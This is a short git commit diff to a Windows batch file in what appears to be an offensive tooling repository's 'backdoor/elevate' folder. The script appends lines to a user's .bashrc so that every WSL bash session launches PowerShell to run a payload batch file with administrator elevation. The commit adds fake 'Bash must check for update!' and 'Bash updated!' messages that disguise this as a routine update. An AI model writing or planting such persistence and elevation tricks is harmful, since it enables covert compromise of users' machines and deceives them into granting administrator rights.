0f2b2824fee13c9f776a9d15e7bb24d548495d19
Cervoise <antoine.cervoise@gmail.com>
2018-10-09 14:54:55 +0200

    Update WSL-RunAsPowershell.bat

--- backdoor/elevate/WSL-RunAsPowershell.bat
+++ backdoor/elevate/WSL-RunAsPowershell.bat
@@ -1,5 +1,7 @@
 bash
+cd
+echo " echo \"Bash must check for update! \"" >> .bashrc
 echo " /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command \"Start-Process c:\users\victim\BashUpdate.bat -Verb RunAs\"" >> .bashrc
+echo " echo \"Bash updated! \"" >> .bashrc
 exit
-echo Bash must update! > BashUpdate.bat
 echo yourPayload > BashUpdate.bat
